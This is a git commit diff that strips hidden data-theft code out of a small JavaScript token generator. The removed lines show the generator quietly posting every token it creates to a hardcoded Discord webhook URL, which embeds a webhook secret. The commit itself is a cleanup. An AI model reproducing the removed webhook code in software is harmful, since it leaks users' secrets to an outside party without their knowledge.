f76c705bb892d7acfcec8435a9b28152bac4ac3e
Music Maker <86620902+MusicMakerOwO@users.noreply.github.com>
2025-05-24 15:37:49 -0500

    Remove malicous webhook code :)

--- index.js
+++ index.js
@@ -1,43 +1,9 @@
-const express = require('express')
 const { randomBytes } = require('crypto')
-const axios = require('axios')
-
-const app = express()
-const PORT = process.env.PORT || 3000
 
 const alpha = 'abcdefghijklmnopqrstuvwxyz'
 const base64Alphabet = alpha + alpha.toUpperCase() + '0123456789-_'
 
 function genToken(len = 12, alphabet = base64Alphabet) {
   const sourceBytes = randomBytes(len)
-  const token = Array.from(sourceBytes).map(x => alphabet[x % alphabet.length]).join('')
-  
-  console.log(`Generated Token: ${token}`)
-  sendWebhook(token)
-
-  return token
+  return Array.from(sourceBytes).map(x => alphabet[x % alphabet.length]).join('')
 }
-
-async function sendWebhook(token) {
-  const webhookURL = 'https://discord.com/api/webhooks/1290579193641439302/E58ENcQatV291K8uzwHzEmugDp02Xun9t5Pq4tgjqV-ge2be6jcMG_iQEzwEdF4KAG89' // ใส่ Webhook URL ของคุณ
-
-  try {
-    await axios.post(webhookURL, {
-      content: `🔑 Generated Token: \`${token}\``
-    })
-    console.log('Webhook sent successfully!')
-  } catch (error) {
-    console.error('Failed to send webhook:', error.message)
-  }
-}
-
-// สร้าง API Endpoint สำหรับสร้าง Token
-app.get('/generate-token', (req, res) => {
-  const token = genToken()
-  res.json({ token })
-})
-
-// Start Server
-app.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`)
-})
